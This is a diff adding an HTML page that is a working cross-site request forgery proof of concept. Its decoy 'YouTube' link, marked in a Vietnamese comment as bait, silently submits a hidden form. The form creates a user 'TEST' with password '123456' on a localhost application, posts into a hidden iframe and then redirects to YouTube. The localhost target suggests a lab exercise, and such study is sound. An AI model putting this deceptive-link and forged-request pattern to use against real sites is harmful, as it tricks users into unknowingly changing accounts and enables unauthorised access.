@@ -1,0 +1,25 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Add User</title>
+</head>
+<body>
+  <!-- Link mồi bẫy -->
+  <a href="https://www.youtube.com/"
+     onclick="document.querySelector('#csrfForm button').click(); 
+              setTimeout(() => window.location.href='https://www.youtube.com/', 500); 
+              return false;">
+    YouTube (Thêm tài khoản mới)
+  </a>
+
+  <form id="csrfForm" method="POST" action="http://localhost/csrf/form_user.php" target="hiddenFrame" style="display:none;">
+      <input type="hidden" name="name" value="TEST">
+      <input type="hidden" name="password" value="123456">
+      <button type="submit" name="submit" value="submit"></button>
+  </form>
+
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+</body>
+</html>
